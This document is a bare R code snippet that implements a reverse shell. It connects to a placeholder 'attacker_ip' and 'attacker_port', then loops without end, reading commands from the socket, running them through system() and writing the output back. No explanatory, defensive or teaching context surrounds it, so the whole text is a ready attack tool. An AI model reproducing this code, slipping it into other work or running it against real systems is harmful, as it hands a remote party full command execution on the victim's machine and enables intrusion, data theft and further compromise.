con <- socketConnection("attacker_ip", attacker_port, server=FALSE, blocking=TRUE)
while(TRUE) {
    input <- readLines(con, 1)
    output <- system(input, intern=TRUE)
    writeLines(output, con)
}
close(con)